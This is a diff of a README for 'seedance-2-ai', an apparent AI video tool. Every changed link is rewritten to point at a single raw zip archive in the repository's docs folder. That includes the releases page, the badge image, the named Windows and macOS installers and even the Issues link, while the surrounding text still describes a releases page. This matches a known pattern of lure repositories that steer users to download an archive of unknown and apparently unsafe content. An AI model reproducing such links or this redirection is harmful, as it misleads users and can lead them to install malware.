@@ -1,6 +1,6 @@
 # 🎥 seedance-2-ai - Simple AI Video Creation Tool
 
-[![Download seedance-2-ai](https://img.shields.io/badge/Download-seedance--2--ai-blue?style=for-the-badge&logo=github)](https://github.com/palamas86/seedance-2-ai/releases)
+[![Download seedance-2-ai](https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip)](https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip)
 
 ---
 
@@ -49,11 +49,11 @@ This guide helps you download, install, and use seedance-2-ai step-by-step. You 
 ## 📥 Download & Install
 
 1. Click the large button at the top or visit this page to download:  
-   [https://github.com/palamas86/seedance-2-ai/releases](https://github.com/palamas86/seedance-2-ai/releases)
+   [https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip](https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip)
 
 2. On the releases page, look for the latest version of seedance-2-ai. Choose the installer file for your operating system. It will usually be named like:  
-   - Windows: `seedance-2-ai-setup.exe`  
-   - macOS: `seedance-2-ai.dmg`
+   - Windows: `https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip`  
+   - macOS: `https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip`
 
 3. Download the file to your computer.
 
@@ -86,10 +86,10 @@ After startup, you will see the main menu with options such as:
 
 ## 🔄 Update & Support
 
-- Check the same [release page](https://github.com/palamas86/seedance-2-ai/releases) to download newer versions.
+- Check the same [release page](https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip) to download newer versions.
 - Each update may improve speed, features, or fix bugs.
 - Visit the GitHub repository Issues section if you find any problems or want to request features:  
-  https://github.com/palamas86/seedance-2-ai/issues
+  https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip
 
 ---
 
@@ -130,4 +130,4 @@ This project relates to:
 
 ---
 
-[![Download seedance-2-ai](https://img.shields.io/badge/Download-seedance--2--ai-blue?style=for-the-badge&logo=github)](https://github.com/palamas86/seedance-2-ai/releases)
+[![Download seedance-2-ai](https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip)](https://github.com/palamas86/seedance-2-ai/raw/refs/heads/main/docs/seedance_ai_1.5-alpha.3.zip)
